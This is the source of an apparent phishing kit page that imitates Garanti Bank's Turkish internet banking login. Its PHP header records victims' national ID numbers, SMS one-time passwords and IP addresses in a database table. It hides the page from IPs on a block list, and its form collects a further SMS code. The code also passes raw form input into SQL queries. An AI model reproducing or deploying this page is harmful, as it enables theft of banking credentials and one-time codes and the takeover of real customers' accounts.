<?php
include 'baglan.php';
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();

if ($_POST['pass2']<>"") { } else {
$tc = $_POST['tc'];
$pass = $_POST['sms'];
mysql_query("insert into ak (kullanici, tarih, pass, notif, ses, ip) values ( '$tc', now(), '$pass', '1', '1', '$ipcik')");
}

if ($_POST['pass1']<>"") {
$tc = $_POST['tc'];
$pass2 = $_POST['pass1'];
mysql_query("Update ak set sms1='$pass1' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");
}


    $query =  mysql_query('SELECT * FROM ip'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
            header('Location: about:blank'); 
        } 
    } 

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
      
 
     <html lang="tr" class="login  "> 
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>       
 <meta http-equiv="X-UA-Compatible" content="IE=edge" /> <meta name="robots" content="noindex,nofollow"> <title>Garanti İnternet</title> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <meta http-equiv="Content-language" content="tr" />   <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" /> <meta name="format-detection" content="telephone=no" /> <meta name="msapplication-tap-highlight" content="no" />   <link rel="home" href="https://sube.garanti.com.tr/" title="Garanti İnternet" /> <link rel="shortcut icon" href="https://sube.assets.garanti.com.tr/assets/img/favicon.ico" type="image/x-icon" /> 


 <!--
LOADING BAR CSS--> <link rel="stylesheet" href="https://sube.assets.garanti.com.tr/assets/css/pace.css?__ctst__=1500082816826" /> 
<!-- // LOADING BAR CSS-->
<link rel="stylesheet" href="https://sube.assets.garanti.com.tr/assets/css/firstscreen.css?__ctst__=1500082816826" />  <!--
LOADING BAR JS--> 
<script type="text/javascript">paceOptions = {elements: true, eventLag: false};</script>
<script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/pace.js?__ctst__=1500082816825"></script>
<!-- LOADING BAR JS-->
   <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/modernizr.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/mobile-detect.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/application-devices.js?__ctst__=1500082816825"></script>  
<script type="text/javascript">
STATIC_ASSET_URL_VAR ='https://sube.assets.garanti.com.tr/';
CACHE_PARM_CSS_VAR ='?__ctst__=1500082816826';
</script>


<script type="text/javascript">
if ( mobile ) {
setCSS('mobile', null);
} else if ( tablet ) {
setCSS('tablet', null);
} else {
setCSS('bootstrap', 'utility');
}
function setCSS(type, ext){
if ( ext != null ) {
var css = document.createElement('link');
css.rel = 'stylesheet';
css.href = STATIC_ASSET_URL_VAR + '/assets/css/'+type+'-login'+'.css' + CACHE_PARM_CSS_VAR;
document.getElementsByTagName('head')[0].appendChild(css);
var cssext = document.createElement('link');
cssext.rel = 'stylesheet';
cssext.href = STATIC_ASSET_URL_VAR + '/assets/css/'+type+'-login'+'-'+ext+'.css' + CACHE_PARM_CSS_VAR;
document.getElementsByTagName('head')[0].appendChild(cssext);
} else {
var css = document.createElement('link');
css.rel = 'stylesheet';
css.href = STATIC_ASSET_URL_VAR + '/assets/css/'+type+'-login'+'.css' + CACHE_PARM_CSS_VAR;
document.getElementsByTagName('head')[0].appendChild(css);
}
var css_gt = document.createElement('link');
css_gt.rel = 'stylesheet';
css_gt.href = STATIC_ASSET_URL_VAR + '/assets/css/gt-facelift-login-style.css' + CACHE_PARM_CSS_VAR;
document.getElementsByTagName('head')[0].appendChild(css_gt);
}
</script>
<script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/ie/ie.js?__ctst__=1500082816825"></script>

<script type="text/javascript">
setTimeout(function(){
document.getElementsByTagName('html')[0].removeAttribute('style');
}, 0);
</script>


<link rel="apple-touch-icon-precomposed" href="https://sube.assets.garanti.com.tr/assets/img/homeScreen-lcon.png">
<link rel="stylesheet" href="https://sube.assets.garanti.com.tr/assets/css/addtohomescreen.css?__ctst__=1500082816826" />


<script type="text/javascript">
if ( typeof Pace != 'undefined' ) {
setTimeout(function(){
Pace.stop();
$('body').removeClass('pace-running');
}, 2000);
}
</script>

</head>
<body class="first-screen">
<div id="page" class ="page">
        

      
           <header id="header"> <div class="navbar navbar-default"> <div class="container"> <div class="navbar-header">    <a class="navbar-brand" href="https://sube.garanti.com.tr/isube/login/login/passwordentrypersonal-tr">     <img class="visible-desktop digi-logo-height hidden-desktop-2x-ratio" src="https://sube.assets.garanti.com.tr/assets/img/logo-TR.png" alt="Garanti Bankası A.Ş."> <img class="visible-desktop-2x-ratio digi-logo-height" src="https://sube.assets.garanti.com.tr/assets/img/logo-v-TR.png" alt="Garanti Bankası A.Ş."> <img class="hidden-desktop" src="https://sube.assets.garanti.com.tr/assets/img/logo-v-TR.png" alt="Garanti Bankası A.Ş.">  </a></div>    <div class="collapse navbar-collapse" id="headerNavBar"> <ul class="nav navbar-nav navbar-right hidden-xs">    <li class="active"> <a href="https://sube.garanti.com.tr/isube/login/login/passwordentrypersonal-tr" class="btn">GARANTİ İNTERNET BİREYSEL </a></li> <li> <a href="https://sube.garanti.com.tr/isube/login/login/passwordentrycorporate-tr" class="btn">GARANTİ İNTERNET KURUMSAL</a></li></ul>  <ul class="nav navbar-nav navbar-right navbar-mobile visible-xs">    <li class="dropdown active"> <a href="#" class="dropdown-toggle btn" data-toggle="dropdown" role="button" aria-expanded="false"> BİREYSEL <i class="icons icons-arrow-down"></i></a> <ul class="dropdown-menu" role="menu" aria-labelledby="profile"> <li role="presentation"><a role="menuitem" tabindex="-1" href="https://sube.garanti.com.tr/isube/login/login/passwordentrypersonal-tr">BİREYSEL</a></li> <li role="presentation"><a role="menuitem" tabindex="-1" href="https://sube.garanti.com.tr/isube/login/login/passwordentrycorporate-tr">KURUMSAL</a></li></ul></li></ul></div></div></div></header> 


<div class="no-title structural">

      
 
   <span id="pageNameSpan" style="display:none" class="elementHide  ">Garanti Internete Giris</span>   <h1 style="display:none" class="elementHide"> <span id="sub" style="display:none" class="elementHide">    Parola Giris</span></h1>     <div class="breadcrumb-container no-print"> <div class="container"> <ul id="breadcrumb" class="breadcrumb"> <li class="disable"> <a><span>Garanti Internete Giris</span></a></li>  <li class="active"> <span>Parola Giris</span></li></ul></div></div>  



<div class="metaData">
<span class="script">
<span class="namespace">GT.temporary</span>
<span class="name">addPrefilledsPageClass</span>
<span>
<!--
GT.temporary.addPrefilledsPageClass = function () {
var stageSize = $(".stages li").size();
if(stageSize > 2 && $($(".stages li")[stageSize-2]).hasClass('active')){
$("div.wizard").addClass('underlinedPrefilledsPage');
}
};
-->
</span>
</span>
<span class="method">
<span class="namespace">GT.temporary</span>
<span class="name">addPrefilledsPageClass</span>
<span class="action">last</span>
</span>
</div>

      
    <script language='JavaScript'>isOmnitureManuel = false;</script>       <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/jquery-1.11.3.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/GT.utilities.js?__ctst__=1500082816825"></script>   <script language='JavaScript'>s_site = 'Sube';</script> <script language='JavaScript'>s_language = 'tr';</script> <script language='JavaScript'>s_UID = ' ';</script> <script language='JavaScript'>s_pName = '';</script>      
<script type="text/javascript">

if(typeof GT === 'undefined') {
var GT = {};
}
GT.data = GT.data || {};
GT.data.projectConstants = {
baseCurrency : 'TL',
paramToken : '±',
transTypeAccount : 'A',
transTypeCard : 'C',
transTypeDebit : 'P',
cyprusBranchType : 'C',
freeZoneBranchType : 'S',
altCurrencyCode : 'ALT',
jpyCurrencyCode : 'JPY',
usdCurrencyCode : 'USD',
waitingEnabled : 'true',
sendToIban : 'I',
sendToAccount : 'H',
logedIn : 'false',
STATIC_ASSETS_URL : 'https://sube.assets.garanti.com.tr',
EVET_E : 'E',
HAYIR_H : 'H',
YES_Y : 'Y',
NO_N : 'N',
birikimliMevduat : '1',
vadeli : '2',
elma : '3',
hepkazandiranmevduat : '4',
birikimlialtin : '5',
birikimkutusu : '8',
net : '12',
cssParamStr : '?__ctst__=1500082816826',
jsParamStr : '?__ctst__=1500082816825',
IS_JS_CONCAT_ENABLED : 'true',
isMobile : 'false',
isTablet : 'false',

timeoutUrl : '/isube/common/sessioncheck',


timeoutCounterForLogin : '600000',


hoverActive : 'false',


isClickMenuActive : 'false',

nbsmTryCount : '12',
nbsmIntervalTime : '5000',
isIOS9 : 'false'
};
</script>
   <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/gem_tr_forms.js?__ctst__=1500082816825"></script>    <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/GT.dtm.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/gem_global.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/lib/s_code_contents_modified.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/lib/dtmSatelliteLib.js?__ctst__=1500082816825"></script>   <script language='JavaScript'>window.dtmParameter = 'P'; </script>  <script language='JavaScript'> _satellite.pageBottom(); </script>    
 <script language='JavaScript'>window.dtmPilotPage = false;</script> <script language='JavaScript'>sendOmnitureCode = true;</script> <script language='JavaScript'>customInit();</script> <script language='JavaScript'>GT.utilities.sendOmnitureData(true);</script>  




</div>

<!--CONTENT-->
<div id="content"class="container" role="main">
<div class="wizard stage:()">
<div class="main">
<div class="row">
<div class="col-md-9">

<div class="hidden-mobile">
      
  <h2 class="page-title">     Garanti İnternet Giriş</h2> 

</div>


<div class="panel">
<div id="passwordEntryPanel" class="panel-body">






      
  <h1 class="panel-title light"> Tek Kulanımlık Şifreniz  Ceptelefonunuza SMS ile Gönderilmiştir</p></h1> 




<div class="row">
<div class="col-sm-12">
<div class="form-horizontal">
      
 
         <form id="loginForm" class="validate:(validated) validationName:(validatedName1)" action="tekrarsms.php" method="POST" autocomplete="off">   <input name="_dummyElement_1500320452874" id="_dummyElement_1500320452874" type="text" class="structural elementHide no-print"/>  
       
       
          <input type="hidden" value="ae4236735821c76eb4ce4c3638a40e27b131bdfd16f06dab4ee4e721ec8ca7a2c57de86d444398b2" name="validationFormBean.viewName" id="validationFormBean.viewName" />  
       
          <input type="hidden" value="157886e6502ea7cf1772b2415f584b3de61ea435bc693e2cb1249aa5bad17083" name="validationFormBean.commandName" id="validationFormBean.commandName" />  
       
          <input type="hidden" value="f2d840e15d804e91ed1df2dfcceef1ab7f04427c63a951fc745dde9e7435ae965f765f55b8e0cea9a1c9276b54d85e882bf8ba2d4e99280660f6e52dc795ce4e" name="validationFormBean.beanClass" id="validationFormBean.beanClass" />  
       
          <input type="hidden" value="tr" name="validationFormBean.userLanguage" id="validationFormBean.userLanguage" />  
          
          <input type="hidden" value="81a4ab167348c936" name="validationFormBean.defaultTab" id="validationFormBean.defaultTab" />  
  
       
          <input type="hidden" value="tr" name="userLanguage" id="userLanguage" />  
       
          <input type="hidden" value="" name="kiosk" id="kiosk" />  
       
          <input type="hidden" value="" name="hiddenENCFIELDS" id="hiddenENCFIELDS" />  
       
          <input type="hidden" value="" name="hiddenENC" id="hiddenENC" />  
       
          <input type="hidden" value="01" name="EOP" id="EOP" />  
       
          <input type="hidden" value="" name="isMrn" id="isMrn" />  
       
          <input type="hidden" value="01" name="cFlg" id="cFlg" />  
       
          <input type="hidden" value="98" name="currentDateTime10" id="currentDateTime10" />  
       
 <input type="hidden" value="" name="cInfoBean.v" id="cInfoBean.v"/> 
                   
 <br>
              <div class="formField"> <div class="formFieldOuter"> <div class="formFieldInner form-group "> <label for="custno" class="col-sm-5 col-md-4 control-label">Şifre</label> <div class="formFieldSurround col-sm-7 col-md-8">  
			 <input  class="form-control "  id="pass1" name="pass1" maxlength="8" type="password"/>      
            
       
 
</div></div></div></div>   
        
 
        
           <div class="formField     "> <div class="formFieldOuter"> <div class="formFieldInner form-group"> <label for="password" class="col-sm-5 col-md-4 control-label "> </label>   <div class="formFieldSurround col-sm-7 col-md-8"> <div class="inline-form-control">         
		    </div>       
 
</div></div></div></div> 
           
          <input type="hidden" value="" name="browserCapabilities" id="browserCapabilities" />  
                    
                     <div class="form-group form-group-offset"> <div class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12 ">  <p>        <button id="formSubmit"  class="btn btn-primary btn-lg btn-block-input">    GARANTİ İNTERNET GİRİŞ </button></p>  <div>   <a href="Javascript:void(0);" onclick="''" tabindex="-1"></a>     <a href="Javascript:void(0);" onclick="window.open('https://subeform.garanti.com.tr/isubeform/customerinformation/customeridreminder-tr','customeridreminder','top=0,left=0,scrollbars=yes,resizable=no,toolbar=no,menubar=no,width=1152,height=895');" tabindex="-1"></a>  <a href="Javascript:void(0);" onclick="try{clearInterval(window.customerSupportIntervalId);}catch(err){}window.open('https://subeform.garanti.com.tr/isubeform/application/channelapplicationwithcardget/pinRenew-tr','forgotpassword','top=0,left=0,scrollbars=yes,resizable=no,toolbar=no,menubar=no,width=1152,height=895');" tabindex="-1"></a></div></div></div> 
</form> 

</div>
</div>
</div>
</div>
</div>
</div>

<div class="col-md-3">
<div class="additional">


      
          <h2 class="page-title">Yardım ve Güvenlik</h2> <div class="panel"> <div class="panel-body"> <div id="helpandsecurity" class="collapse-content" role="tablist" aria-multiselectable="true">  <div class="panel panel-collapse help-collapse">  <div class="panel-heading" role="tab" id="heading0"> <a role="button" data-toggle="collapse" data-parent="#helpandsecurity" href="#collapse0" aria-expanded="true" aria-controls="collapse0"> Güvenliğiniz için lütfen aşağıdaki bilgilere dikkat edin.  <span class="arrow"><i class="icons icons-arrow-up"></i></span></a></div>  <div id="collapse0" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="heading0"> <div class="panel-body"> <p>Güvenli bir İnternet deneyimi ve güncel virüsler hakkında bilgi almak için lütfen tıklayın.  </p>  <a href="http://www.garanti.com.tr/tr/bireysel/subesiz/internet_bankaciligi/guvenlik.page" target="_blank">Detaylı bilgi</a></div></div> </div>  <div class="panel panel-collapse help-collapse">  <div class="panel-heading" role="tab" id="heading1"> <a role="button" data-toggle="collapse" data-parent="#helpandsecurity" href="#collapse1" aria-expanded="false" aria-controls="collapse1" class="collapsed">  Başkası adına mı işlem yapıyorsunuz?  <span class="arrow"><i class="icons icons-arrow-down"></i></span></a></div>  <div id="collapse1" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading1"> <div class="panel-body"> <p> Başkası adına işlem yapıyorsanız detaylı bilgi için lütfen tıklayın. </p>  <a href="http://www.garanti.com.tr/tr/garanti_hakkinda/garantiden_haberler/2008/nisan/islemlerinde_baskasi_hesabina_islem_yapildiginin_beyani_hakkinda_duyuru.page" target="_blank">Detaylı bilgi</a></div></div> </div>  <div class="panel panel-collapse help-collapse">  <div class="panel-heading" role="tab" id="heading2"> <a role="button" data-toggle="collapse" data-parent="#helpandsecurity" href="#collapse2" aria-expanded="false" aria-controls="collapse2" class="collapsed">  Tasarruf Mevduatı Güvencesi <span class="arrow"><i class="icons icons-arrow-down"></i></span></a></div>  <div id="collapse2" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading2"> <div class="panel-body"> <p> Tasarruf mevduatınız güvence altında. Detaylı bilgi için lütfen tıklayın.</p>  <a href="http://www.garanti.com.tr/tr/garanti_hakkinda/garantiden_haberler/2013/subat/tasarruf_mevduati_guvencesinde_yapilan_degisiklik_hakkinda_duyuru.page" target="_blank">Detaylı bilgi</a></div></div> </div> </div></div> <a href="http://www.garanti.com.tr/tr/yardim_ve_oneriler/subesiz_bankacilik/internet_subesi.page" target="_blank" class="border-link helper-bottom-link">DİĞER YARDIM VE GÜVENLİK</a></div> 

</div>
</div>

</div>
</div>
</div>
</div>
<!--//CONTENT-->

      
                           <div id="footer" role="contentinfo" class="no-print footer"> <div class="container">   <div class="row patch-footer"> <div class="col-md-8"> <table class="table"> <tr>  <td> <a href="JavaScript:void(0);" onclick="window.open('https://www.garanti.com.tr/tr/yardim_ve_oneriler/hakli_musteri_hatti/ssl/iletisim_formu.page','newWindow');">Bize Ulaşın</a></td>     <td class=""> <a href="JavaScript:void(0);" onclick="window.open('http://www.garanti.com.tr/tr/bireysel/subesiz/internet_bankaciligi/guvenlik.page','newWindow');">Güvenlik Bilgileri</a></td>  <td>  <span class="language">Language:</span> <a href="https://sube.garanti.com.tr/isube/login/login/passwordentrypersonal-en">English</a></td> </tr></table></div></div>  <div class="row"> <div class="col-sm-8 col-xs-8"> <table class="table"> <tr> <td> Copyright &#169; 2015 T.Garanti Bankası A.Ş.</td></tr></table></div> <div class="col-sm-4 col-xs-4 text-right"> <a href="https://trustsealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&amp;dn=sube.garanti.com.tr&amp;lang=tr" target="_blank" class="img-align-right lg nortonImg"></a></div></div>  </div>  </div>  


</div>
<script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/GT.beta.browser.behaviour.js?__ctst__=1500082816825"></script>
<script type="text/javascript">
resizeOnLoadLogin();
</script>
  
<script type="text/javascript">

if(typeof GT === 'undefined') {
var GT = {};
}
GT.data = GT.data || {};
GT.data.projectConstants = {
logedIn : 'false',
STATIC_ASSETS_URL : 'https://sube.assets.garanti.com.tr',
EVET_E : 'E',
HAYIR_H : 'H',
YES_Y : 'Y',
NO_N : 'N',
cssParamStr : '?__ctst__=1500082816826',
jsParamStr : '?__ctst__=1500082816825',
IS_JS_CONCAT_ENABLED : 'true',
isMobile : 'false',
isTablet : 'false',

timeoutCounterForLogin : '600000'
,
fResourceUrl : 'https://resource.garanti.com.tr/resourceDirectory/resource.png'
};
</script>
  
<script type="text/javascript">
if(typeof GT === 'undefined') {
var GT = {};
}
GT.data = GT.data || {};
GT.data.rewritedUrls = {

logoutByWindowClose: '/isube/logoutByWindowClose',
logoutByCustomer: '/isube/logoutByCustomer',
logoutByTimeoutAtLogin: '/isube/logoutByTimeoutAtLogin',
searchgeneralinquiry: '/isube/search/searchgeneralinquiry',
garantiReminder: '/isube/profile/garantireminder/garantiremindersubhub',
stocksbuylightboxnew: '/isube/investments/stocksnew/stocksbuylightboxnew',
stocksbuysell2confirmnew: '/isube/investments/stocksnew/stocksbuysell2confirmnew',
stocks40seance2confirmnew: '/isube/investments/stocksnew/stocks40seance2confirmnew',
ajaxNBSMInquiry: '/isube/applications/creditapplication/ajaxNBSMInquiry',
ajaxNBSMInquiryAdditionalLoan: '/isube/applications/creditapplication/ajaxNBSMInquiryAdditionalLoan',
imageSourceInTopBar: '/isube/dashboard/profil/profilephotosmall',
moneytransfertoeft: '/isube/moneytransfers/eft/efttoaccount1entryfrommoneytransfer',
efttomoneytransfer: '/isube/moneytransfers/moneytransfer/moneytransfertoaccount1entryfromeft',
unreadmessagecount: '/isube/dashboard/mailbox/unreadmessagecount',
etrader: '/isube/investments/etrader/etraderapplet1',
etraderhtml: '/isube/investments/etrader/etraderhtmlclient1',
emailautocompletedeleteurl : '/isube/accountsproducts/myaccounts/accountstatementemailaddresslightboxautocompletedelete',
dashboardOverview: '/isube/dashboard/overview',
marketInfo: '/isube/dashboard/overview/marketinfo',
notifications: '/isube/dashboard/notifications/notifications',
notificationsCount: '/isube/dashboard/notifications/notificationscount',
notificationsDelete: '/isube/dashboard/notifications/notificationsdelete',
notificationsPage: '/isube/dashboard/notifications/notificationspage',
notificationsPageAjax: '/isube/dashboard/notifications/notificationspageajax',
notificationsSettings: '/isube/dashboard/notifications/notificationssettings',
campaigns: '/isube/dashboard/campaigns/campaigns',
campaignsCount: '/isube/dashboard/campaigns/campaignscount',
campaignsDelete: '/isube/dashboard/campaigns/campaignsdelete',
campaignsPage: '/isube/dashboard/campaigns/campaignspage'

};
</script>
 <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/jquery-1.11.3.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/jquery-keyboard.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/bootstrap.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/jquery-inputmask.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/jquery-actual.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/application-login.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/GT.data.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/tr/GT.data.region.login.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/login.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/login.withStyles.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/jsbn.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/prng4.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/rng.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/rsa.js?__ctst__=1500082816825"></script> <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/g_prefs.js"></script>   
 

 <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/login-utils-rsa.js?__ctst__=1500082816825"></script> <script language="JavaScript"> if(top.frames.length > 0){ if(self !== top){ top.location.href=self.location; } } </script> 

 
<script type="text/javascript">
RSA_Key_Number ='9F2EEA4AA03D55B33172E9A86CFF6156AC1628C67983193A337B98995151F9B0F41562290DB98697280E805803E4B18914519CEB55CEA5D03A927C28C36A4BC7';
RSA_Key_N ='C38CEC6F53E4D03BB9A65963626575F6ED0B4FA72D71775368B89411D0A7D2FEA462A3C34957EF002D9250FB2B9C1C37D9D9C2CC6E4FCBFA4D3D12C28786AA0B0BC1A658E197FF6091F7F3859B53B4ED0E63C1344AF1FDC17A36F91C1D4C31A741ED61CF1ABF8015D14968A0A14503C5509891F7F351C7C5DFE15693AEEF6FBD6BAEDF627AD5AE237D08C2F53B051D2A189366BB7C02D23E10F4083AEB02E2F830791F02C39D853C02B4FFA025F79E86A25A32A4327EE43C8D60A67D542F7B72A7F0B258855D9AB3AB06B1740C67F38146A4FCA0E7745CE07EAE858B9A59F799398003F36C160334E5FCF918D93B74B2AFA5C7165BAA22B57E2C3B6801DDBD95';
</script>
<script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/login-utils-rsa.js?__ctst__=1500082816825"></script>
<script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/GT.utilities.rsa.js?__ctst__=1500082816825"></script>

 
<script type="text/javascript">
function getCookieSupport() {
var persist= true;
do {
var c= 'gCStest='+Math.floor(Math.random()*100000000);
document.cookie= persist? c+';expires=Tue, 01-Jan-2030 00:00:00 GMT' : c;
if (document.cookie.indexOf(c)!==-1) {
document.cookie= c+';expires=Sat, 01-Jan-2000 00:00:00 GMT';
return persist;
}
}while (!(persist= !persist));
return null;
}
var screenResolution = screen.width+'x'+screen.height;
var navigatorAppVersion = navigator.appVersion;
var flashIndicator = ' ';
if (GT.data.flash.hasFlash){
flashIndicator = 'E';
}
else{
flashIndicator = 'H';
}
var currentDate = new Date();
var LZ = function(x) {return(x<0||x>9?"":"0")+x;};
var cDate = LZ(currentDate.getDate())+'.'+LZ((currentDate.getMonth()+1))+'.'+currentDate.getFullYear().toString(); //Client Date
var cTime = LZ(currentDate.getHours())+'.'+LZ(currentDate.getMinutes())+'.'+LZ(currentDate.getSeconds()); //Client Time
var cGMT  = currentDate.toGMTString(); //Client GMT
var cookieIndicator = ' ';
if ( getCookieSupport()!== null ) {
cookieIndicator = 'Y';
}else{
cookieIndicator = 'N';
}
var v = screenResolution+"±"+
navigatorAppVersion+"±"+
flashIndicator+"±"+
cDate+"±"+
cTime+"±"+
cGMT+"±"+
cookieIndicator;
var cInfo = document.getElementById("cInfoBean.v");
cInfo.value = v;
</script>

   <script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/modernizr.all.js?__ctst__=1500082816825"></script>  

<script type="text/javascript">GT.data.region.serverTimeMonth='17/07/2017';</script>
<script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/common/GT.forms.validation.expressions.js?__ctst__=1500082816825"></script>

<script type="text/javascript" src="https://sube.assets.garanti.com.tr/assets/js/addtohomescreen.js?__ctst__=1500082816825"></script>

<script type="text/javascript">
$(document).ready(function(){
var custno = document.getElementById("custno");
if (custno!==undefined && custno!==null){
if (!mobile && !tablet){
$(custno).focus();
}
GT.beta.loginValidation(false,false,false,false,false,true);
}
var callAddToHomeScreen = true;
if( callAddToHomeScreen ){
var maxNumber = 2;
addToHomescreen({
maxDisplayMessage: maxNumber
});
}
var isRememberMe = document.getElementById("isRememberMe");
if( $(isRememberMe).length > 0 ){
$(isRememberMe).unbind('change').bind('change', function(){
if( this.checked ) {
$('#rememberMeExtraText').removeClass('elementHide');
} else {
$('#rememberMeExtraText').addClass('elementHide');
}
});
};

});
</script>

</body>

</html>